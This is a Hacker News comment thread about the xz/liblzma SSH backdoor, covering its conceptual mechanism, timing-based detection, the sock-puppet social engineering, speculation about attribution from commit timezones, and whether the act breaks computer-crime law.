certs in a password manager might be a good backup (and rotating it after using it on an untrusted source?). The best way is, however, removing the need in emergencies to access a machine (e.g. more of the "cattle vs pets" way of thinking). But that's hard for sure. | | --- | --- | --- | | | |  |  | [danparsonson](user?id=danparsonson) [9 months ago](item?id=39917096)   | [root](#39877698) | [parent](#39912915) | [next](#39882008) [–]  > ...rotating it after using it on an untrusted source?... > ...the "cattle vs pets" way of thinking... Good points both... To the former, of course you're right that once used, an emergency cert should be replaced, which could be onerous either from the point of view of having double the number of certs to manage (rather than one master key), or else having to rotate the master key on all servers. To the latter, I'm definitely thinking about pets, so I hadn't considered just throwing away the VM and starting again; that neatly sidesteps the issue. Thanks! | | --- | --- | --- | | | |  |  | [Too](user?id=Too) [9 months ago](item?id=39882008)   | [root](#39877698) | [parent](#39879623) | [prev](#39880204) | [next](#39881461) [–]  A lot of it has to do with centralizing administration. If you have more than one server and more than one user, certificates reduce a NxM problem into N+M instead. Certificates can be revoked, they can have short expiry dates and due to centralized administration, renewing them is not terribly inconvenient. On top of that they are a lot more difficult to read over the shoulder, to some degree that can be considered the second factor in a MFA scheme. Same reasons why passkeys are preferred over passwords lately. Not as secure as a HW-key, still miles better than “hunter2”. | | --- | --- | --- | | | |  |  | [computerfriend](user?id=computerfriend) [9 months ago](item?id=39881461)   | [root](#39877698) | [parent](#39879623) | [prev](#39882008) | [next](#39879791) [–]  I sometimes ask this as an interview question. Hardly anybody knows the answer. | | --- | --- | --- | | | |  |  | [sureglymop](user?id=sureglymop) [9 months ago](item?id=39881831)   | [root](#39877698) | [parent](#39881461) | [next](#39879791) [–]  So don't you want to enlighten us with the answer? | | --- | --- | --- | | | |  |  | [computerfriend](user?id=computerfriend) [9 months ago](item?id=39886905)   | [root](#39877698) | [parent](#39881831) | [next](#39879791) [–]  The enlightenment has happened in the other comments, but the summary is: \* this enforces high entropy, \* the password is transmitted to the server, the private key is not. | | --- | --- | --- | | | |  |  | [denysvitali](user?id=denysvitali) [9 months ago](item?id=39879791)   | [root](#39877698) | [parent](#39879623) | [prev](#39881461) | [next](#39877997) [–]  The difference, IMHO, is that it's easier to pick an easy guessable password than it is to create an insecure RSA key (on purpose). | | --- | --- | --- | | | |  |  | [CodesInChaos](user?id=CodesInChaos) [9 months ago](item?id=39877997)   | [parent](#39877698) | [prev](#39877824) | [next](#39878357) [–]  It might be possible to use timing information to detect this, since the signature verification code appears to only run if the client public key matches a specific fingerprint. The backdoor's signature verification should cost around 100us, so keys matching the fingerprint should take that much longer to process than keys that do not match it. Detecting this timing difference should at least be realistic over LAN, perhaps even over the internet, especially if the scanner runs from a location close to the target. Systems that ban the client's IP after repeated authentication failures will probably be harder to scan. (<https://bench.cr.yp.to/results-sign.html> lists Ed448 verification at around 400k cycles, which at 4GHz amounts to 100us) | | --- | --- | --- | | | |  |  | [Thorrez](user?id=Thorrez) [9 months ago](item?id=39878386)   | [root](#39877698) | [parent](#39877997) | [next](#39878122) [–]  According to[1], the backdoor introduces a much larger slowdown, without backdoor: 0m0.299s, with backdoor: 0m0.807s. I'm not sure exactly why the slowdown is so large. [1] <https://www.openwall.com/lists/oss-security/2024/03/29/4> | | --- | --- | --- | | | |  |  | [CodesInChaos](user?id=CodesInChaos) [9 months ago](item?id=39878642)   | [root](#39877698) | [parent](#39878386) | [next](#39878122) [–]  The effect of the slowdown on the total handshake time wouldn't work well for detection, since without a baseline you can't tell if it's slow due to the backdoor, or due to high network latency or a slow/busy CPU. The relative timing of different steps in the TCP and SSH handshakes on the other hand should work, since the backdoor should only affect one/some steps (RSA verification), while others remain unaffected (e.g. the TCP handshake). | | --- | --- | --- | | | |  |  | [pstrateman](user?id=pstrateman) [9 months ago](item?id=39878122)   | [root](#39877698) | [parent](#39877997) | [prev](#39878386) | [next](#39878357) [–]  However only probabilistic detection is possible that way and really 100us variance over the internet would require many many detection attempts to discern. | | --- | --- | --- | | | |  |  | [Thorrez](user?id=Thorrez) [9 months ago](item?id=39878357)   | [parent](#39877698) | [prev](#39877997) | [next](#39877790) [–]  The tweet says "unreplayable". Can someone explain how it's not replayable? Does the backdoored sshd issue some challenge that the attacker is required to sign? | | --- | --- | --- | | | |  |  | [candiodari](user?id=candiodari) [9 months ago](item?id=39878463)   | [root](#39877698) | [parent](#39878357) | [next](#39877790) [–]  What it does is this: RSA\_public\_decrypt verifies a signature on the client's (I think) host key by a fixed Ed448 key, and then if it verifies, passes the payload to system(). If you send a request to SSH to associate (agree on a key for private communications), signed by a specific private key, it will send the rest of the request to the "system" call in libc, which will execute it in bash. So this is quite literally a "shellcode". Except, you know, it's on your system. | | --- | --- | --- | | | |  |  | [Thorrez](user?id=Thorrez) [9 months ago](item?id=39887172)   | [root](#39877698) | [parent](#39878463) | [next](#39877790) [–]  That sounds repayable though. If I did a tcpdump of the attacker attacking my system, I could replay that attack against someone other system. For it to not be replayable, there needs to be some challenge issued by the backdoored sshd. Of course since the backdoor was never widely deployed and is now public, I think it's unlikely the attacker will attempt to use it. So whether it's replayable doesn't have a practical impact now. I'm only asking about replayability because I'm curious how it's unreplayable. | | --- | --- | --- | | | |  |  | [noncoml](user?id=noncoml) [9 months ago](item?id=39877790)   | [prev](#39877698) | [next](#39883121) [–]  Unpopular opinion, but I cannot but admire the whole operation. Condemn it of course, but still admire it. It was a piece of art! From conception to execution, masterful! We got extremely lucky that it was caught so early. | | --- | --- | --- | | | |  |  | [Tuna-Fish](user?id=Tuna-Fish) [9 months ago](item?id=39878611)   | [parent](#39877790) | [next](#39879393) [–]  If the payload didn't have a random .5 second hang during SSH login, it would probably not have been found for a long time. The next time, the attackers probably manage to build a payload that doesn't cause weird latency spikes on operations that people wait on. (For some reason this brings to mind how Kim Dotcom figured out he was the target of an illegal wiretap... because he suddenly had a much higher ping in MW3. When he troubleshooted, he found out that all his packets specifically got routed a very long physical distance through a GCSB office. GCSB has no mandate to wiretap permanent NZ residents. He ended up getting a personal apology from the NZ Prime Minister.) | | --- | --- | --- | | | |  |  | [jijijijij](user?id=jijijijij) [9 months ago](item?id=39879440)   | [root](#39877790) | [parent](#39878611) | [next](#39880012) [–]  > If the payload didn't have a random .5 second hang during SSH login, it would probably not have been found for a long time. Ironic, how an evil actor failed for a lack of premature optimization :D | | --- | --- | --- | | | |  |  | [BuildTheRobots](user?id=BuildTheRobots) [9 months ago](item?id=39880012)   | [root](#39877790) | [parent](#39878611) | [prev](#39879440) | [next](#39879393) [–]  I'm a little out of touch, but for over a decade I'd say half the boxes I touched either didn't have enough entropy or were trying to do rDNS for (internal) ranges to servers that didn't host it and is nearly always hand waved away by the team running it as NFN. That is to say, a half-second pause during the ssh login is absolutely the \_least\_ suspicious place place for it to happen and I'm somewhat amazed anyone thought to go picking at it as quickly as they did. | | --- | --- | --- | | | |  |  | [dannyw](user?id=dannyw) [9 months ago](item?id=39882263)   | [root](#39877790) | [parent](#39880012) | [next](#39879393) [–]  What led to continuous investigation wasn't just the 500ms pause, but large spikes in CPU activity when sshd was invoked, even without a login attempt. | | --- | --- | --- | | | |  |  | [BuildTheRobots](user?id=BuildTheRobots) [9 months ago](item?id=39884779)   | [root](#39877790) | [parent](#39882263) | [next](#39879393) [–]  What lead to it was the fact he was already micro-benchmarking postgresql along with a couple of other bits of fluke. We were all extremely lucky. | | --- | --- | --- | | | |  |  | [jijijijij](user?id=jijijijij) [9 months ago](item?id=39879393)   | [parent](#39877790) | [prev](#39878611) | [next](#39877849) [–]  > *"After all, He-Who-Must-Not-Be-Merged did great things - terrible, yes, but great."* I think the most ingenious part was picking the right project to infiltrate. Reading "Hans'" IFUNC pull request discussion is heart-wrenching in hindsight, but it really shows why this project was chosen. I would love to know how many people where behind "Jia" and "Hans" analyzing and strategizing communication and code contributions. Some aspects, like those third tier personas faking pressure on mailing lists, seem a bit carelessly crafted, so I think it's still possible this was done by a sophisticated small team or even single individual. I presume a state actor would have people pumping out and maintaining fake personas all day for these kind of operations. I mean, would have kinda sucked, if someone thought: "Hm. It's a bit odd how rudely these three users are pushing. Who are they anyway? Oh, look they are all created at the same time. Suspicious. Why would anyone fake accounts to push so hard for this specifically? I need to investigate". Compared to the overall effort invested, that's careless, badly planned or underfunded. | | --- | --- | --- | | | |  |  | [bcrescimanno](user?id=bcrescimanno) [9 months ago](item?id=39879615)   | [root](#39877790) | [parent](#39879393) | [next](#39880439) [–]  > Compared to the overall effort invested, that's careless, badly planned or underfunded. Not at all. It's a pattern that's very easy to spot while the eyes of the world are looking for it. When it was needed, it worked exactly as it needed to work. Had the backdoor not been discovered, no one would have noticed--just like no one did notice for the past couple of years. Had anyone noticed at the time, it would have been very easy to just back off and try a different tactic a few months down the line. Once something worked, it would be quick to fade into forgotten history--unlikely to be noticed until, like now, the plan was already discovered. | | --- | --- | --- | | | |  |  | [hun3](user?id=hun3) [9 months ago](item?id=39880439)   | [root](#39877790) | [parent](#39879393) | [prev](#39879615) | [next](#39877849) [–]  Carelessness could arguably a part of operation: testing/probing how thoroughly the community scrutinizes communication from untrusted individuals. | | --- | --- | --- | | | |  |  | [dc-programmer](user?id=dc-programmer) [9 months ago](item?id=39877849)   | [parent](#39877790) | [prev](#39879393) | [next](#39879522) [–]  I agree, but the social engineering parts do feel particularly cruel | | --- | --- | --- | | | |  |  | [nocoiner](user?id=nocoiner) [9 months ago](item?id=39878024)   | [root](#39877790) | [parent](#39877849) | [next](#39879522) [–]  I felt really bad for the original maintainer getting dog-piled by people who berated him for not doing his (unpaid) job and basically just bring shame and discredit to himself and the community. Definitely cruel. Though… do we know that the maintainer at that point was the same individual as the one who started the project? Goes deep, man. | | --- | --- | --- | | | |  |  | [thinkingemote](user?id=thinkingemote) [9 months ago](item?id=39879087)   | [root](#39877790) | [parent](#39878024) | [next](#39878355) [–]  Its possible the adversary was behind or at least encouraged the dog piling who berated him. Probably a normal basic tactic from a funded evil team playbook. Might be worth reviewing those who berated him to see if they resolve to real people, to see how deep this operation goes. | | --- | --- | --- | | | |  |  | [returningfory2](user?id=returningfory2) [9 months ago](item?id=39879338)   | [root](#39877790) | [parent](#39879087) | [next](#39879309) [–]  This has been investigated and the conclusion is IMO clear: the dogpilling accounts were part of the operation. See the parts about Jigar Kumar in this link: [https://boehs.org/node/everything-i-know-about-the-xz-backdo...](https://boehs.org/node/everything-i-know-about-the-xz-backdoor) | | --- | --- | --- | | | |  |  | [formerly\_proven](user?id=formerly_proven) [9 months ago](item?id=39879309)   | [root](#39877790) | [parent](#39879087) | [prev](#39879338) | [next](#39878355) [–]  One of them who left only one comment does, the rest are sock puppets. | | --- | --- | --- | | | |  |  | [StefanBatory](user?id=StefanBatory) [9 months ago](item?id=39878355)   | [root](#39877790) | [parent](#39878024) | [prev](#39879087) | [next](#39879522) [–]  Even if it's not his fault the maintainer at this point won't be trusted at all. I feel for him, I think even finding a job at this moment for him would be impossible. Why would you hire someone that could be suspected for that? | | --- | --- | --- | | | |  |  | [plg94](user?id=plg94) [9 months ago](item?id=39879330)   | [root](#39877790) | [parent](#39878355) | [next](#39878729) [–]  No. From what I've read on the openwall and lkml mailing lists (so generally people who know a lot more about these things than I do), nobody accused Lasse Collins, the original maintainer, of being involved in this, at all, and there wasn't any notion of him becoming untrustworthy. | | --- | --- | --- | | | |  |  | [polio](user?id=polio) [9 months ago](item?id=39878729)   | [root](#39877790) | [parent](#39878355) | [prev](#39879330) | [next](#39879522) [–]  This could've happened to anybody, frankly. The attacker was advanced and persistent. I cannot help but feel sympathetic for the original maintainer here. | | --- | --- | --- | | | |  |  | [consumer451](user?id=consumer451) [9 months ago](item?id=39878842)   | [root](#39877790) | [parent](#39878729) | [next](#39879522) [–]  From TFA's profile: [https://bsky.app/profile/filippo.abyssdomain.expert/post/3ko...](https://bsky.app/profile/filippo.abyssdomain.expert/post/3kovq64a2g32g) This is a profound realization, isn't it? How much more paranoid should/will maintainers be going forward? | | --- | --- | --- | | | |  |  | [kstrauser](user?id=kstrauser) [9 months ago](item?id=39879522)   | [parent](#39877790) | [prev](#39877849) | [next](#39879475) [–]  I bet it’s not that unpopular. It’s a very impressive attack in many ways: - It’s subtle. - It was built to over several years. - If the attacker hadn’t screwed up the with the weird performance hit that triggered investigation (my dramatic theory: the attacker was horrified at the infonuclear bomb they were detonating and deliberately messed up), we likely wouldn’t know about it. You can detest the end result while appreciating the complexity of the attack. | | --- | --- | --- | | | |  |  | [empath-nirvana](user?id=empath-nirvana) [9 months ago](item?id=39879475)   | [parent](#39877790) | [prev](#39879522) | [next](#39883121) [–]  I don't think "admire" is the right word, but it's a pretty impressive operation. | | --- | --- | --- | | | |  |  | [grepLeigh](user?id=grepLeigh) [9 months ago](item?id=39883121)   | [prev](#39877790) | [next](#39878188) [–]  I'm assuming nation states and similar actors monitor mailing lists for phrases like "I'm feeling burnt out" or "not enough bandwidth, can you open a PR?" According to the timeline here, trust was established in "only" a few years. [https://boehs.org/node/everything-i-know-about-the-xz-backdo...](https://boehs.org/node/everything-i-know-about-the-xz-backdoor) So I imagine major actors already have other assets in at-risk open source projects, either for the source code or distro patch/packaging level. Is that too tinfoil hat? I only know enough about secops to be dangerous to myself and everyone around me. | | --- | --- | --- | | | |  |  | [junon](user?id=junon) [9 months ago](item?id=39884508)   | [parent](#39883121) | [next](#39878188) [–]  > Is that too tinfoil hat? Not at all, no. This is probably happening way more than just this instance, unfortunately. | | --- | --- | --- | | | |  |  | [jmward01](user?id=jmward01) [9 months ago](item?id=39878188)   | [prev](#39883121) | [next](#39879487) [–]  Where is the law enforcement angle on this? This individual/organization needs to be on the top of every country's most wanted lists. | | --- | --- | --- | | | |  |  | [bawolff](user?id=bawolff) [9 months ago](item?id=39879043)   | [parent](#39878188) | [next](#39878886) [–]  Its been all of 24 hours, these things take time. Presumably someone doing an attack this audacious took steps to cover their tracks and is using a fake name. | | --- | --- | --- | | | |  |  | [1oooqooq](user?id=1oooqooq) [9 months ago](item?id=39878886)   | [parent](#39878188) | [prev](#39879043) | [next](#39879220) [–]  easy there. calling the cops on the NSA might be treason or something | | --- | --- | --- | | | |  |  | [BlueFalconHD](user?id=BlueFalconHD) [9 months ago](item?id=39879586)   | [root](#39878188) | [parent](#39878886) | [next](#39879843) [–]  Like that spiderman meme, it's all the NSA | | --- | --- | --- | | | |  |  | [concordDance](user?id=concordDance) [9 months ago](item?id=39879843)   | [root](#39878188) | [parent](#39878886) | [prev](#39879586) | [next](#39879220) [–]  I would have thought NSA would have hardware/firmware backdoor everywhere and wouldn't need this. | | --- | --- | --- | | | |  |  | [redox99](user?id=redox99) [9 months ago](item?id=39880040)   | [root](#39878188) | [parent](#39879843) | [next](#39879220) [–]  Probably not for fully Chinese hardware. Although this backdoor is only x86 so it still wouldn't work there. | | --- | --- | --- | | | |  |  | [tootie](user?id=tootie) [9 months ago](item?id=39879220)   | [parent](#39878188) | [prev](#39878886) | [next](#39879340) [–]  CISA had a report on this pretty quickly. I think they refer cases to Secret Service for enforcement. But really, we seemingly have no idea who or where the perpetrator is located. This could easily be a state actor. It could be a lone wolf. And the effects of the attack would be global too, so jurisdiction is tricky. We really have no idea at this point. The personas used to push the commits and push for inclusion were almost certainly fronts. I'm sure github is sifting through a slew of subpoenas right now. | | --- | --- | --- | | | |  |  | [grepfru\_it](user?id=grepfru_it) [9 months ago](item?id=39880286)   | [root](#39878188) | [parent](#39879220) | [next](#39879340) [–]  github retains an incredible amount of data to review. but if it is a state actor, they likely covered their tracks very well. when i found the original address of the person who hacked elon musk's twitter account it led to an amazon ec2 instance. that instance was bought with stolen financial information and accessed via several vpns and proxies. i would expect state actors to further obfuscate their tracks with shell companies and the like | | --- | --- | --- | | | |  |  | [Randalthorro](user?id=Randalthorro) [9 months ago](item?id=39880652)   | [root](#39878188) | [parent](#39880286) | [next](#39879340) [–]  State actors get to invent people. Literally. | | --- | --- | --- | | | |  |  | [pcthrowaway](user?id=pcthrowaway) [9 months ago](item?id=39879340)   | [parent](#39878188) | [prev](#39879220) | [next](#39879701) [–]  Based on the level of sophistication being alluded to, I'm personally inclined to assume this is a state actor, possible even some arm of the U.S. govt. | | --- | --- | --- | | | |  |  | [dboreham](user?id=dboreham) [9 months ago](item?id=39879885)   | [root](#39878188) | [parent](#39879340) | [next](#39881520) [–]  To me it seems too clumsy to be USG. They seem to prefer back doors that are undetectable or hide in plain sight. But it might be an NSA op designed to instigate a much needed serious examination of the supply chain. | | --- | --- | --- | | | |  |  | [dannyw](user?id=dannyw) [9 months ago](item?id=39880429)   | [root](#39878188) | [parent](#39879885) | [next](#39882971) [–]  Remember how bad, slow, and obvious Dual\_EC\_DRNG was? | | --- | --- | --- | | | |  |  | [\_kb](user?id=_kb) [9 months ago](item?id=39882971)   | [root](#39878188) | [parent](#39879885) | [prev](#39880429) | [next](#39881520) [–]  That would honestly be one of the most impactful bits of public service to fall out of any agency, regardless of country. Even if this is nefarious, a couple of intentionally clumsy follow-ups designed to draw further attention would be amazing to see. Think chaos monkey for software supply chain. | | --- | --- | --- | | | |  |  | [rustcleaner](user?id=rustcleaner) [9 months ago](item?id=39886539)   | [root](#39878188) | [parent](#39882971) | [next](#39881520) [–]  Can the community aspects of FOSS survive a Spy vs Spy environment though? I don't know, but the answer is irrelevant to whether we are in one (we are). I shudder to think what lurks in the not-open-source world. Closed source software/firmware/microcode, closed spec/design hardware; and artificial restriction of device owners from creating replacement code, or modifying code in consumer and capital goods containing universal machines as components; are significant national security threats and the practice of keeping design internals and intent secret in these products produces a cost on society. I propose that products which don't adhere to GNU-like standards of openness (caveat\*) get national sales taxed some punitive obscene percentage, like 100%. This way the government creates an artificial condition which forces companies to comply lest their market pricing power be absolutely hobbled. If say your company makes five $10MM industrial machines for MEGACORP customer and you're the only game in town, MEGACORP can pay the sales tax. Brian, Dale, and Joe Sixpack can't afford $2,500+ iPhones and Playstations, or $70,000 base model Honda Civics (yes this should apply to cars and especially medical devices/prosthetics), so when Company B comes around making a somewhat inferior competing fully open product then Company A making the proprietary version loses a huge chunk of market share. (\*But not the GNU-spirit distribution rights, so the OEM or vendor is still the only entity legally allowed to distribute [except for national emergency level patches]. Patent rights still apply.) This is the most direct and sane way to address the coming waves of decade+ old lightbulbs and flatscreens. It has fewest "But if" gotcha exceptions with which to keep screwing you. Stop sticking up for your boss and think about the lack of access to your own devices, or better yet the implicit and nonconsensual perpetual access vendors maintain to universal machines which by all rights only you should have sovereign control over (like cooking your own microcode or tweaking Intel's [but not distributing your tweaks to Intel's])! | | --- | --- | --- | | | |  |  | [Muromec](user?id=Muromec) [9 months ago](item?id=39881520)   | [root](#39878188) | [parent](#39879340) | [prev](#39879885) | [next](#39879407) [–]  Overcomplicated design, sloppy opsec and Eastern European time zone altogether sound more like an attempt to snatch some bitcoins by a small group of people in places. | | --- | --- | --- | | | |  |  | [numpad0](user?id=numpad0) [9 months ago](item?id=39882029)   | [root](#39878188) | [parent](#39881520) | [next](#39879407) [–]  I wonder what had happened in Eastern Europe ~2 years ago... | | --- | --- | --- | | | |  |  | [Muromec](user?id=Muromec) [9 months ago](item?id=39882849)   | [root](#39878188) | [parent](#39882029) | [next](#39879407) [–]  The obvious, but not yet pointed out part here -- not everything we call "EE" here is actually using EET/EEST. | | --- | --- | --- | | | |  |  | [tejohnso](user?id=tejohnso) [9 months ago](item?id=39879407)   | [root](#39878188) | [parent](#39879340) | [prev](#39881520) | [next](#39879701) [–]  > possible even some arm of the U.S. govt. Possible. But why mention U.S. specifically? Is it more likely than Russia, Iran, China, France ... ? | | --- | --- | --- | | | |  |  | [pcthrowaway](user?id=pcthrowaway) [9 months ago](item?id=39879463)   | [root](#39878188) | [parent](#39879407) | [next](#39879425) [–]  > This individual/organization needs to be on the top of every country's most wanted lists Because if the "organization" is a U.S. agency, not much is going to happen here. Russia or China or North Korea might make some strongly worded statements, but nothing is going to happen. It's also very possible that security researchers won't be able to find out, and government agencies will finger-point as a means of misdirection. For example, a statement comes out in a month that this was North Korea. Was it really? Or are they just a convenient scapegoat so the NSA doesn't have to play defense on its lack of accountability again? | | --- | --- | --- | | | |  |  | [mardifoufs](user?id=mardifoufs) [9 months ago](item?id=39879425)   | [root](#39878188) | [parent](#39879407) | [prev](#39879463) | [next](#39879701) [–]  The US is behind more documented backdoors than those other countries. | | --- | --- | --- | | | |  |  | [EasyMark](user?id=EasyMark) [9 months ago](item?id=39880135)   | [root](#39878188) | [parent](#39879425) | [next](#39879701) [–]  Highly likely, China has been estimated to have cyberhacking resources that are 10-50x what the USA has currently. It's not even close. The USA will have to up it's game soon or accept China being able to shut down large swathes of the grid and critical infrastructure at will | | --- | --- | --- | | | |  |  | [lulznews](user?id=lulznews) [9 months ago](item?id=39879701)   | [parent](#39878188) | [prev](#39879340) | [next](#39878810) [–]  Lmao it’s a state actor bro | | --- | --- | --- | | | |  |  | [mik1998](user?id=mik1998) [9 months ago](item?id=39878810)   | [parent](#39878188) | [prev](#39879701) | [next](#39878201) [13 more]  [flagged] | | --- | --- | --- | | | |  |  | [hnarn](user?id=hnarn) [9 months ago](item?id=39878943)   | [root](#39878188) | [parent](#39878810) | [next](#39878201) [–]  based on what? | | --- | --- | --- | | | |  |  | [mik1998](user?id=mik1998) [9 months ago](item?id=39879016)   | [root](#39878188) | [parent](#39878943) | [next](#39878201) [–]  I did my own research. If you look at the git repository commit log and some mailing list messages, you will see that the author ("Jia Tan", fake name) speaks impeccable English (already lessens the chance of being a Chinese operative), however he commits in the +0800 time zone (Beijing). He works during Chinese holidays and doesn't work during Western holidays. However, the times don't make sense: It looks like he works mostly at 2am: <https://files.catbox.moe/6mdtez.png> (hours in the +0800 timezone). I understand this to be indicative of using a different timezone on the computer than where he actually worked, possibly knowing that git commits include the timezone. If you shift the timezone to US East Coast -0400, it suddenly looks like a very comfortable full-time job, including a fall in commit rate right where the lunch break should be: <https://files.catbox.moe/dtvjzr.png> To me, considering that this appears to be a nation-state tier attack, heavily indicates that it was the Americans. Obviously not conclusive proof, but I think it is useful evidence. | | --- | --- | --- | | | |  |  | [Aloisius](user?id=Aloisius) [9 months ago](item?id=39880785)   | [root](#39878188) | [parent](#39879016) | [next](#39879529) [–]  > and doesn't work during Western holidays ? They worked on US Federal holidays. MLK Jr. Day: ```   Commit:     Jia Tan <jiat0218@gmail.com>   CommitDate: Mon Jan 16 21:35:45 2023 +0800  ``` Thanksgiving: ```   Commit:     Jia Tan <jiat0218@gmail.com>   CommitDate: Thu Nov 23 22:40:27 2023 +0800  ``` Juneteenth: ```   Author:     Jia Tan <jiat0218@gmail.com>   AuthorDate: Wed Jul 19 23:36:00 2023 +0800  ``` Washington's Birthday: ```   Author:     Jia Tan <jiat0218@gmail.com>   AuthorDate: Fri Jan 20 21:53:14 2023 +0800  ``` New Years Day (Federal): ```   Author:     Jia Tan <jiat0218@gmail.com>   AuthorDate: Mon Jan 2 22:33:48 2023 +0800   ``` Edit: Also my graphs don't seem to match yours. Did you account for the fact that US/Eastern is -0500 part of the year? I show a spike at what would be 7 am Eastern for both author dates <https://imgur.com/a/QcJy16h> and commit dates <https://imgur.com/a/oMsbNOh> and essentially no work being done after noon. | | --- | --- | --- | | | |  |  | [dolmen](user?id=dolmen) [9 months ago](item?id=39879529)   | [root](#39878188) | [parent](#39879016) | [prev](#39880785) | [next](#39880814) [–]  Another analysis locates Jia in Eastern Europe: [https://rheaeve.substack.com/p/xz-backdoor-times-damned-time...](https://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and) But I would like to see analysis of timestamp of GitHub events (like PRs and comments timestamps) which are harder to fake. | | --- | --- | --- | | | |  |  | [mik1998](user?id=mik1998) [9 months ago](item?id=39879625)   | [root](#39878188) | [parent](#39879529) | [next](#39880694) [–]  It's a nice analysis but he misses the fact that the Eastern Europe timezone doesn't match office hours, in particular it'd mean he worked around evenings primarily (see this graph <https://files.catbox.moe/4itspl.png>) I had noticed UTC+0300 commits in the repository under his name but I believed they might have been simply committed by the main Finnish maintainer who is in the UTC+0300 timezone. > But I would like to see analysis of timestamp of GitHub events (like PRs and comments timestamps) which are harder to fake. I doubt the git commit timestamps are faked, since actually faking them is somewhat difficult to do consistently (you would time travel frequently). I don't think there is some kind of github API for this, however from what I've seen they seem to match up with the same work timespan you see in the commit timestamps. | | --- | --- | --- | | | |  |  | [Aloisius](user?id=Aloisius) [9 months ago](item?id=39881434)   | [root](#39878188) | [parent](#39879625) | [next](#39880666) [–]  > *I had noticed UTC+0300 commits in the repository under his name but I believed they might have been simply committed by the main Finnish maintainer who is in the UTC+0300 timezone.* There was this one though where they are the author and committer... one in +0300, the other in +0800: ```   commit 3d1fdddf92321b516d55651888b9c669e254634e   Author:     Jia Tan <jiat0218@gmail.com>   AuthorDate: Tue Jun 27 17:27:09 2023 +0300   Commit:     Jia Tan <jiat0218@gmail.com>   CommitDate: Tue Jun 27 23:56:06 2023 +0800  ``` The time between writing the file and the commit is 89 minutes. | | --- | --- | --- | | | |  |  | [Randalthorro](user?id=Randalthorro) [9 months ago](item?id=39880666)   | [root](#39878188) | [parent](#39879625) | [prev](#39881434) | [next](#39880694) [–]  You can find the GitHub events here, I compiled them into CSVs. <https://github.com/emirkmo/xz-backdoor-github> I literally run a git hook that fixes my commit times so I don’t look like a freak to my coworkers making commits at 3am, I think an actor of this caliber would too, so I would bet the git commit times are highly choreographed. | | --- | --- | --- | | | |  |  | [aragilar](user?id=aragilar) [9 months ago](item?id=39880694)   | [root](#39878188) | [parent](#39879529) | [prev](#39879625) | [next](#39880814) [–]  FYI, the Australian comment is wrong, WA (which uses UTC+8) *does not* DST (there's a party to add it, and multiple referenda which failed to add it), given ASIS is in Canberra (as far as we know ;)), it probably wasn't them. | | --- | --- | --- | | | |  |  | [dragonwriter](user?id=dragonwriter) [9 months ago](item?id=39880814)   | [root](#39878188) | [parent](#39879016) | [prev](#39879529) | [next](#39879378) [–]  > He works during Chinese holidays and doesn't work during Western holidays. “Western Holidays”, as if that is a coherent, cross-nationally consistent set. Other than the fact that you specific suggestion of it being American makes little sense based in this sibce its not accurate construed as *American* holidays, this phrasing is bizarre in this context. | | --- | --- | --- | | | |  |  | [dolmen](user?id=dolmen) [9 months ago](item?id=39879378)   | [root](#39878188) | [parent](#39879016) | [prev](#39880814) | [next](#39878201) [–]  Do you have some scripts publicly available to reproduce your research? | | --- | --- | --- | | | |  |  | [mik1998](user?id=mik1998) [9 months ago](item?id=39879579)   | [root](#39878188) | [parent](#39879378) | [next](#39878201) [–]  I used the git repo at [https://git.phial.org/d6/xz-analysis-mirror/commits/branch/m...](https://git.phial.org/d6/xz-analysis-mirror/commits/branch/master/search?q=Jia+Tan) and simply did ```   git log --format=%cd --author="Jia Tan"   ``` and then processed it a bit with gnuplot. Should not be difficult to reproduce this graph, but I am not too much of a gnuplot wizard so I first preprocessed this into some different files in a REPL. Don't have the full code of what I did but it should not be difficult to reproduce, just parse the dates and look at the hours. | | --- | --- | --- | | | |  |  | [Aloisius](user?id=Aloisius) [9 months ago](item?id=39881115)   | [root](#39878188) | [parent](#39879579) | [next](#39878201) [–]  You should include git log --committer=Jia too as they committed what appears to be their other fake account's changes as well. Also there are separate author times vs. commit times. | | --- | --- | --- | | | |  |  | [ganeshkrishnan](user?id=ganeshkrishnan) [9 months ago](item?id=39878201)   | [parent](#39878188) | [prev](#39878810) | [next](#39878227) [2 more]  [flagged] | | --- | --- | --- | | | |  |  | [stephc\_int13](user?id=stephc_int13) [9 months ago](item?id=39878228)   | [root](#39878188) | [parent](#39878201) | [next](#39878227) [–]  How do you know that? | | --- | --- | --- | | | |  |  | [greyface-](user?id=greyface-) [9 months ago](item?id=39878227)   | [parent](#39878188) | [prev](#39878201) | [next](#39879487) [–]  I understand the impulse to seek justice, but what crime have they committed? It's illegal to gain unauthorized access, but not to write vulnerable code. Is there evidence that this is being exploited in the wild? | | --- | --- | --- | | | |  |  | [jmward01](user?id=jmward01) [9 months ago](item?id=39878364)   | [root](#39878188) | [parent](#39878227) | [next](#39878969) [–]  I am definitely not a lawyer so I have no claim to knowing what is or is not a crime. However, if backdooring SSH on a potentially wide scale doesn't trip afoul of laws then we need to seriously have a discussion about the modern world. I'd argue that investigating this as a crime is likely in the best interest of public safety and even (I hesitate to say this) national security considering the potential scale of this. Finally, I would say there is a distinction between writing vulnerable code and creating a backdoor with malicious intent. It appears (from the articles I have been reading so far) that this was malicious, not an accident or lack of skill. We will see over the next few days though as more experts get eyes on this. | | --- | --- | --- | | | |  |  | [greyface-](user?id=greyface-) [9 months ago](item?id=39878464)   | [root](#39878188) | [parent](#39878364) | [next](#39880011) [–]  Agreed on a moral level, and it's true that describing this as simply "vulnerable code" doesn't capture the clear malicious intent. I'm just struggling to find a specific crime. CFAA requires unauthorized access to occur, but the attacker was authorized to publish changes to xz. Code is speech. It was distributed with a "no warranty" clause in the license. | | --- | --- | --- | | | |  |  | [semiquaver](user?id=semiquaver) [9 months ago](item?id=39878962)   | [root](#39878188) | [parent](#39878464) | [next](#39878578) [–]  CFAA covers this. Its a crime to ```   > knowingly [cause] the transmission of a program, information, code, or command, and as a result of such conduct, intentionally causes damage without authorization, to a protected computer;  ``` Where one of the definitions of “protected computer” is one that is used in interstate commerce, which covers effectively all of them. | | --- | --- | --- | | | |  |  | [pbhjpbhj](user?id=pbhjpbhj) [9 months ago](item?id=39879389)   | [root](#39878188) | [parent](#39878962) | [next](#39878578) [–]  It seems like the backdoor creates the potential to "cause damage" but doesn't [provably?] cause damage *per se*? The author of the backdoor doesn't themselves "[cause] the transmission of a program ...". Others do the transmission. Seems weak, unless you know of some precedent case(s)? | | --- | --- | --- | | | |  |  | [whartung](user?id=whartung) [9 months ago](item?id=39879637)   | [root](#39878188) | [parent](#39879389) | [next](#39880115) [–]  The back door is damage. The resulting sshd is like a door with a broken lock. This patch breaks the lock. Transmitting the patch caused intentional damage. | | --- | 